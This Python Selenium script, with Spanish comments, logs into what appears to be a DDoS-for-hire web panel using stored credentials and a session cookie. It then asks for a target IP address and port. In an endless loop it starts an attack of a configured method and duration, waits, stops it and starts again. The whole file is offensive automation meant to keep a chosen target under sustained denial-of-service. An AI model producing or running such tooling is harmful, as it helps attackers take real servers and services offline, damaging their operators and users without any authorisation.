from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
from selenium.webdriver.chrome.options import Options
from selenium.webdriver import ChromeService, FirefoxService
from selenium.common.exceptions import *

import os
import logging
import requests
import time
import json
from rich.console import Console

from bot import Bot
from config import Config
from utils.presets import Presets
import subprocess



config = Config()

username = config.accounts[0][0]
password = config.accounts[0][1]


# TODO: CAMBIAR TODO ESTO Y MODULAR
"""logger = logging.getLogger('selenium')
logger.setLevel(logging.DEBUG)
handler = logging.FileHandler("./logs/selenium/selenium.log")
logger.addHandler(handler)"""

presets = Presets("chrome")
service, options = presets.default()



driver = webdriver.Firefox(service=service, options=options)

# TODO: CAMBIAR ESTO
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"
]

# TODO: CAMBIAR ESTO
cookies = [
    {
        "name": "UID",
        "value": os.getenv("cookie")
    }
]






def get_user_input():
    console = Console()

    ip = console.input(f"Ingrese la dirección IP (por defecto: {config.attack['ip']}): ")
    if ip == "":
        ip = config.attack["ip"]

    port = console.input(f"Ingrese el puerto (por defecto: {config.attack['port']}): ")
    if port == "":
        port = config.attack["port"]

    return ip, port

ip, port = get_user_input()

info = {
    "cookies": [

    ],
    "username": config.accounts[0][0],
    "password": config.accounts[0][1],
    "userAgent": ...
}

bot = Bot(driver=driver, info=info)
bot.login_form()
bot.DDoS_page()
bot.close_button()

i = 1
while True:
    i = i + 1
    try:
        bot.start_attack(ip, port, config.attack["time"], config.attack["method"])
        print(f"ejecución: {i}")
        time.sleep(config.attack["time"])
        bot.stop_attack(bot.get_running_attacks(bot.get_cookies())["running"][0]["id"])
    except Exception as e:
        print(f"Error en ejecución: {i}\n   Error: {e}")
    finally:
        pass
